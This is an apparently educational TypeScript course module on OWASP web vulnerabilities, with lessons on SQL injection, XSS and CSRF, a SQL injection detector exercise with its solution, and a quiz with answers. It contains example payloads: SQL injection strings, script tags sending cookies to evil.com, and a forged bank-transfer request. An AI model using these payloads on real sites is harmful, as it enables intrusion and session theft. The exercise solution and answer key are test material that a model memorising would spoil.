import { Module } from "../types";

export const webVulnerabilitiesModule: Module = {
  id: "eh-web-vulnerabilities",
  title: "Web Vulnerabilities (OWASP Top 10)",
  description: "Master the most critical web application security risks. Learn how SQL injection, XSS, CSRF, and other OWASP Top 10 vulnerabilities work and how to defend against them.",
  lessons: [
    {
      id: "eh-sql-injection",
      slug: "sql-injection",
      title: "SQL Injection",
      content: `## SQL Injection

<!-- voice:section_check -->

SQL injection (SQLi) is one of the oldest and most devastating web vulnerabilities. Despite being well-understood since the late 1990s, it remains in the OWASP Top 10 because developers keep making the same mistakes.

### How It Works

When user input is concatenated directly into SQL queries:

\`\`\`python
# VULNERABLE CODE — never do this!
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
\`\`\`

If an attacker enters \`admin' --\` as the username:

\`\`\`sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
\`\`\`

The \`--\` comments out the rest of the query, bypassing the password check entirely.

### Types of SQL Injection

| Type | Technique | Detection |
|------|----------|-----------|
| **Classic (In-band)** | Attacker sees results directly in the response | Error messages, visible data changes |
| **Blind (Boolean)** | Attacker asks true/false questions via query behavior | Page renders differently based on condition |
| **Time-based Blind** | Attacker uses SLEEP() to infer information | Response time varies based on condition |
| **Out-of-band** | Attacker uses DNS or HTTP requests to exfiltrate data | Requires network monitoring |

### Real-World Impact

- **Heartland Payment Systems (2008)**: SQL injection led to theft of 130 million credit card numbers. Cost: $140 million.
- **Sony Pictures (2011)**: SQLi attack exposed personal data of 77 million PlayStation Network users.
- **Equifax (2017)**: While not pure SQLi, the breach exploited an injection vulnerability (CVE-2017-5638) affecting 147 million people.

<!-- voice:key_insight -->

### The Fix: Parameterized Queries

**Never** concatenate user input into SQL. Use parameterized queries (prepared statements):

\`\`\`python
# SAFE — parameterized query
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)
\`\`\`

The database treats the parameters as data, not executable SQL. Even if the user enters \`admin' --\`, it is treated as a literal string.

### Defense Checklist

1. **Parameterized queries**: Always. No exceptions.
2. **Input validation**: Whitelist expected characters
3. **Least privilege**: Database user should have minimal permissions
4. **WAF**: Web Application Firewall can block common SQLi patterns
5. **Error handling**: Never expose database errors to users

### Key Takeaway

SQL injection exploits the mixing of code (SQL) and data (user input). Parameterized queries are the definitive fix because they enforce the separation of code and data at the database level.

### Further Reading

- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- CVE-2017-5638 (Equifax): https://nvd.nist.gov/vuln/detail/CVE-2017-5638`,
    },
    {
      id: "eh-sqli-detector-exercise",
      slug: "sqli-detector-exercise",
      title: "Exercise: SQL Injection Detector",
      content: `## Exercise: SQL Injection Detector

Build a function that detects common SQL injection patterns in user input. This is a simplified version of what Web Application Firewalls (WAFs) do.

### Common SQLi Patterns

- SQL keywords in unexpected places: \`UNION\`, \`SELECT\`, \`DROP\`, \`DELETE\`
- Comment sequences: \`--\`, \`/*\`, \`#\`
- String terminators: single quotes used to break out of string context
- Boolean-based probing: \`' OR '1'='1\`, \`' OR 1=1 --\`
- Stacked queries: semicolons followed by new SQL statements

### Hints

- Use regular expressions for pattern matching
- Check case-insensitively (\`UNION\` and \`union\` are both dangerous)
- Balance false positives vs. false negatives — a name like "O'Brien" contains a single quote but is not an attack`,
      starterCode: `import re

def detect_sqli(user_input):
    """Detect potential SQL injection patterns in user input.

    Args:
        user_input: string from a form field
    Returns:
        dict: {
            'is_suspicious': bool,
            'risk_level': 'safe' | 'low' | 'medium' | 'high',
            'patterns_found': list of strings describing detected patterns
        }
    """
    patterns_found = []

    # TODO: Check for SQL comment sequences (-- or /* or #)

    # TODO: Check for UNION-based injection (UNION followed by SELECT)

    # TODO: Check for boolean-based injection (' OR '1'='1, OR 1=1, etc.)

    # TODO: Check for stacked queries (;DROP, ;DELETE, ;UPDATE, etc.)

    # TODO: Check for SQL keywords in suspicious context
    # (SELECT, INSERT, UPDATE, DELETE, DROP, EXEC, etc.)

    # TODO: Determine risk level based on patterns found
    # high: UNION SELECT, stacked queries, or boolean bypass
    # medium: SQL keywords detected
    # low: comment sequences or unusual characters
    # safe: no patterns detected

    pass

def sanitize_input(user_input):
    """Basic input sanitization - escape dangerous characters.

    Args:
        user_input: raw string from user
    Returns:
        str: sanitized string
    """
    # TODO: Escape single quotes by doubling them
    # TODO: Remove null bytes
    # TODO: Strip leading/trailing whitespace
    pass

def validate_username(username):
    """Validate that a username contains only allowed characters.

    Allowed: letters, numbers, underscores, hyphens, periods.
    Length: 3-30 characters.

    Args:
        username: string to validate
    Returns:
        tuple: (is_valid: bool, reason: str)
    """
    # TODO: Check length constraints
    # TODO: Check character whitelist using regex
    pass

# Test cases
print("=== SQL Injection Detection ===")

safe_inputs = ["john_doe", "alice123", "O'Brien"]
for inp in safe_inputs:
    result = detect_sqli(inp)
    print(f"  '{inp}' -> {result['risk_level']}")

dangerous_inputs = [
    "admin' --",
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1 UNION SELECT username, password FROM users",
]
for inp in dangerous_inputs:
    result = detect_sqli(inp)
    print(f"  '{inp}' -> {result['risk_level']} ({result['patterns_found']})")

print("\\n=== Input Sanitization ===")
print(sanitize_input("admin' OR '1'='1"))
# Expected: "admin'' OR ''1''=''1"

print("\\n=== Username Validation ===")
print(validate_username("john_doe"))
# Expected: (True, 'valid')
print(validate_username("a"))
# Expected: (False, 'too short...')
print(validate_username("admin'; DROP TABLE--"))
# Expected: (False, 'invalid characters...')`,
      solutionCode: `import re

def detect_sqli(user_input):
    """Detect potential SQL injection patterns in user input."""
    patterns_found = []
    inp = user_input.strip()

    # Check for SQL comment sequences
    if re.search(r'(--|/\\*|#)', inp):
        patterns_found.append("SQL comment sequence")

    # Check for UNION-based injection
    if re.search(r'\\bUNION\\b.*\\bSELECT\\b', inp, re.IGNORECASE):
        patterns_found.append("UNION SELECT injection")

    # Check for boolean-based injection
    if re.search(r"'\\s*(OR|AND)\\s+['\\"0-9]", inp, re.IGNORECASE):
        patterns_found.append("Boolean-based injection")
    if re.search(r"\\bOR\\s+1\\s*=\\s*1", inp, re.IGNORECASE):
        patterns_found.append("Boolean bypass (OR 1=1)")

    # Check for stacked queries
    if re.search(r';\\s*(DROP|DELETE|UPDATE|INSERT|ALTER|CREATE|EXEC)', inp, re.IGNORECASE):
        patterns_found.append("Stacked query with dangerous keyword")

    # Check for SQL keywords in suspicious context
    sql_keywords = r'\\b(SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|CREATE|EXEC|EXECUTE|TRUNCATE)\\b'
    if re.search(sql_keywords, inp, re.IGNORECASE) and "UNION" not in inp.upper():
        patterns_found.append("SQL keyword detected")

    # Determine risk level
    high_patterns = ["UNION SELECT injection", "Stacked query with dangerous keyword", "Boolean-based injection", "Boolean bypass (OR 1=1)"]
    medium_patterns = ["SQL keyword detected"]

    if any(p in patterns_found for p in high_patterns):
        risk_level = "high"
    elif any(p in patterns_found for p in medium_patterns):
        risk_level = "medium"
    elif patterns_found:
        risk_level = "low"
    else:
        risk_level = "safe"

    return {
        'is_suspicious': len(patterns_found) > 0,
        'risk_level': risk_level,
        'patterns_found': patterns_found,
    }

def sanitize_input(user_input):
    """Basic input sanitization - escape dangerous characters."""
    sanitized = user_input.replace("'", "''")
    sanitized = sanitized.replace("\\x00", "")
    return sanitized.strip()

def validate_username(username):
    """Validate that a username contains only allowed characters."""
    if len(username) < 3:
        return (False, "too short: minimum 3 characters")
    if len(username) > 30:
        return (False, "too long: maximum 30 characters")
    if not re.match(r'^[a-zA-Z0-9_\\-.]+$', username):
        return (False, "invalid characters: only letters, numbers, _, -, . allowed")
    return (True, "valid")

# Time complexity: O(n) per input where n is input length
# Space complexity: O(n) for regex operations

# Test cases
print("=== SQL Injection Detection ===")

safe_inputs = ["john_doe", "alice123", "O'Brien"]
for inp in safe_inputs:
    result = detect_sqli(inp)
    print(f"  '{inp}' -> {result['risk_level']}")

dangerous_inputs = [
    "admin' --",
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1 UNION SELECT username, password FROM users",
]
for inp in dangerous_inputs:
    result = detect_sqli(inp)
    print(f"  '{inp}' -> {result['risk_level']} ({result['patterns_found']})")

print("\\n=== Input Sanitization ===")
print(sanitize_input("admin' OR '1'='1"))
# Expected: "admin'' OR ''1''=''1"

print("\\n=== Username Validation ===")
print(validate_username("john_doe"))
# Expected: (True, 'valid')
print(validate_username("a"))
# Expected: (False, 'too short...')
print(validate_username("admin'; DROP TABLE--"))
# Expected: (False, 'invalid characters...')`,
    },
    {
      id: "eh-xss-csrf",
      slug: "xss-and-csrf",
      title: "Cross-Site Scripting (XSS) & CSRF",
      content: `## Cross-Site Scripting (XSS) & CSRF

<!-- voice:section_check -->

XSS and CSRF are the two most common client-side web vulnerabilities. Both exploit the trust relationship between users and websites.

### Cross-Site Scripting (XSS)

XSS occurs when an attacker injects malicious JavaScript into a web page that other users view.

**Stored XSS** (most dangerous): Malicious script is permanently stored on the server (e.g., in a comment or forum post).

\`\`\`html
<!-- Attacker posts this as a "comment" -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
\`\`\`

Every user who views the comment has their cookies stolen.

**Reflected XSS**: Malicious script is included in a URL parameter and reflected back in the response.

\`\`\`
https://example.com/search?q=<script>alert('XSS')</script>
\`\`\`

**DOM-based XSS**: The vulnerability is in client-side JavaScript that unsafely uses user input.

### XSS Prevention

1. **Output encoding**: Escape HTML special characters (\`<\` -> \`&lt;\`, \`>\` -> \`&gt;\`)
2. **Content Security Policy (CSP)**: HTTP header that restricts which scripts can execute
3. **HttpOnly cookies**: Prevents JavaScript from accessing cookies
4. **Input validation**: Whitelist allowed characters and formats

<!-- voice:key_insight -->

### Cross-Site Request Forgery (CSRF)

CSRF tricks an authenticated user's browser into making unwanted requests. If you are logged into your bank and visit a malicious page:

\`\`\`html
<!-- On evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
\`\`\`

Your browser sends the request with your bank cookies attached. The bank sees a valid, authenticated request.

### CSRF Prevention

1. **CSRF tokens**: Include a random, per-session token in each form that the server validates
2. **SameSite cookies**: Set \`SameSite=Strict\` or \`SameSite=Lax\` to prevent cross-origin cookie sending
3. **Referer/Origin checking**: Verify the request came from your own domain
4. **Custom headers**: Require a custom header (e.g., X-Requested-With) that cross-origin requests cannot set

### The Difference

| | XSS | CSRF |
|---|---|---|
| **What** | Inject code into a page | Forge a request from a user |
| **Exploits trust in** | User trusts the website | Website trusts the user's browser |
| **Attacker needs** | Injection point | User to be authenticated |
| **Impact** | Steal data, modify page, keylog | Perform actions as the user |

### Key Takeaway

XSS and CSRF exploit different trust relationships. XSS injects code into trusted pages; CSRF forges requests from trusted browsers. Output encoding prevents XSS; CSRF tokens prevent CSRF. Both require defense-in-depth approaches.

### Further Reading

- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP CSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html`,
    },
    {
      id: "eh-web-vuln-checkpoint",
      slug: "web-vulnerabilities-checkpoint",
      title: "Checkpoint: Web Vulnerabilities",
      content: `## Checkpoint: Web Vulnerabilities

<!-- voice:section_check -->

Test your understanding of web application security.

---

### Question 1
What is the definitive fix for SQL injection?

A) Input validation and sanitization
B) Parameterized queries (prepared statements)
C) Web Application Firewall (WAF)
D) Escaping special characters

**Answer: B** — Parameterized queries enforce separation between SQL code and user data at the database level. The database treats parameters as data regardless of their content. Other measures add defense-in-depth but are not sufficient alone.

---

### Question 2
An attacker posts the following in a forum comment: \`<script>fetch('https://evil.com?c='+document.cookie)</script>\`. This is an example of:

A) Reflected XSS
B) Stored XSS
C) CSRF
D) SQL Injection

**Answer: B** — The malicious script is stored permanently on the server (in the forum database) and executes in every user's browser who views the comment. This is Stored XSS — the most dangerous form.

---

### Question 3
CSRF attacks work because:

A) The attacker can read the victim's cookies
B) The browser automatically sends cookies with every request to a domain, regardless of where the request originates
C) The attacker has access to the server
D) The victim's browser has a vulnerability

**Answer: B** — Browsers attach cookies for a domain to every request to that domain, even if the request originates from a different site. CSRF exploits this by causing the victim's browser to make authenticated requests to the target site.

---

### Question 4
A Content Security Policy (CSP) header \`default-src 'self'\` would:

A) Block all JavaScript execution
B) Only allow loading resources from the same origin, blocking inline scripts and external resources
C) Encrypt all page content
D) Validate all user input

**Answer: B** — CSP \`default-src 'self'\` restricts resource loading to the same origin. Inline scripts, eval(), and external CDNs would be blocked unless explicitly whitelisted. This is a powerful XSS mitigation.

---

### Question 5
Which combination of defenses would best protect a web application against both XSS and CSRF?

A) Output encoding + CSRF tokens + SameSite cookies + CSP
B) Input validation alone
C) HTTPS only
D) Strong passwords

**Answer: A** — Output encoding prevents XSS by neutralizing injected HTML/JavaScript. CSRF tokens verify request authenticity. SameSite cookies prevent cross-origin cookie sending. CSP provides an additional layer against XSS. Defense-in-depth is essential.`,
    },
  ],
};
